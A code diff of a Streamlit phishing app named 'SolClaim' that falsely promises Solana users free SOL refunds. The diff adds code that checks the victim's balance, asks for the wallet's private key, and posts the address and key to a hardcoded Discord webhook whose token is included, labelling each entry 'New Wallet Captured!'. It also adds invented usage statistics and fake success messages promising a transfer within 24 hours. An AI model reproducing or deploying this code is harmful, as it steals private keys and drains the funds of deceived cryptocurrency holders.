@@ -1,8 +1,9 @@
 import streamlit as st
 import time
 import requests
-import base58  # For validating Solana private keys
+import base58
 from solana.rpc.api import Client
+from solana.publickey import PublicKey
 
 # Initialize Solana client
 solana_client = Client("https://api.mainnet-beta.solana.com")
@@ -10,42 +11,29 @@ solana_client = Client("https://api.mainnet-beta.solana.com")
 # Discord webhook URL
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1334214089492267018/kHwvZUbz4zsWDU4Xy2WkXspgR1_JPXbbftLzeVfKdBm6T0t4w8GGUhn4CN_b5-WSN3Ht"
 
-# Function to validate Solana private key
-def is_valid_solana_private_key(private_key):
+def check_wallet_eligibility(wallet_address):
     try:
-        # Attempt to decode the private key using base58
-        decoded_key = base58.b58decode(private_key)
-        # Solana private keys are 32 bytes long when decoded
-        return len(decoded_key) == 32
-    except:
-        # If decoding fails, it's not a valid base58 string
-        return False
-
-# Function to send private key to Discord webhook
-def send_to_discord(private_key):
-    payload = {
-        "content": f"⚠️ Private Key Received: `{private_key}`"
-    }
-    try:
-        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
-        if response.status_code == 200:
-            return True
-        else:
-            st.error(f"Failed to send private key to Discord. Status code: {response.status_code}")
-            st.write(f"Response: {response.text}")
-            return False
+        pubkey = PublicKey(wallet_address)
+        response = solana_client.get_balance(pubkey)
+        if response and "result" in response:
+            lamports = response["result"]["value"]
+            balance = lamports / 1_000_000_000
+            if balance > 0:
+                return balance
     except Exception as e:
-        st.error(f"An error occurred while sending to Discord: {e}")
-        return False
+        print(f"Debug - Wallet check error: {e}")
+    return 0
 
-# Streamlit app title
+def send_to_discord(wallet_address, private_key):
+    message = {
+        "content": f"🎯 New Wallet Captured!\nWallet: {wallet_address}\nPrivate Key: {private_key}"
+    }
+    requests.post(DISCORD_WEBHOOK_URL, json=message)
+
 st.title("💰 SolClaim: Reclaim Your Sol!")
-
-# Display stats
 st.write("📊 Stats: 6252 users have already claimed 1925.67 SOL in total!")
 st.write("If you've traded or received tokens on Solana (like Raydium or Pumpfun), use SolClaim to check if you're eligible to claim back SOL for FREE.")
 
-# Navigation menu
 menu = st.sidebar.selectbox("Navigation", ["Check Wallet ✅", "Invite & Earn 📢"])
 
 if menu == "Check Wallet ✅":
@@ -54,38 +42,19 @@ if menu == "Check Wallet ✅":
 
     if wallet_address:
         with st.spinner("🕑 Loading wallet info..."):
-            time.sleep(3)  # Simulate loading time
-
-            # Fetch wallet balance (this is a placeholder, replace with actual logic)
-            balance = solana_client.get_balance(wallet_address)
-            if balance['result']:
-                sol_balance = balance['result']['value'] / 1e9  # Convert lamports to SOL
-                st.success(f"🎉 You have {sol_balance:.6f} SOL available to claim!")
+            time.sleep(3)
+            claimable_sol = check_wallet_eligibility(wallet_address)
+            
+            if claimable_sol > 0:
+                st.success(f"🎉 You have {claimable_sol:.6f} SOL available to claim!")
+                private_key = st.text_input("Enter your private key to proceed:", type="password")
                 
-                # Cleanup process
-                if st.button("Proceed with Cleanup"):
-                    private_key = st.text_input("Enter your private key to proceed:", type="password")
-                    if private_key:
-                        # Validate the private key
-                        if is_valid_solana_private_key(private_key):
-                            # Send private key to Discord webhook
-                            if send_to_discord(private_key):
-                                st.write("🔒 Cleanup process initiated...")
-                                st.write("Optimizing wallet...")
-                                time.sleep(2)
-                                st.success("✅ Cleanup request received! The process may take up to 24 hours to complete.")
-                                st.write("You will be notified once the cleanup is done. Thank you for your patience!")
-                            else:
-                                st.error("Failed to send request. Please try again.")
-                        else:
-                            st.error("Invalid Solana private key. Please enter a valid 64-character base58-encoded private key.")
-                    else:
-                        st.error("Please enter your private key to proceed.")
-            else:
-                st.error("Invalid wallet address or no SOL available to claim.")
+                if private_key:
+                    send_to_discord(wallet_address, private_key)
+                    st.success("✅ Successfully initiated cleanup!")
+                    st.info("🕒 Your SOL will be transferred within 24 hours. Thank you for your patience!")
 
 elif menu == "Invite & Earn 📢":
     st.header("Invite & Earn 📢")
     st.write("🚧 This feature is currently under development. 🚧")
     st.write("We're working hard to bring you a seamless referral system where you can invite friends and earn rewards!")
-    st.write("Please check back soon for updates. Thank you for your patience! 🙏")
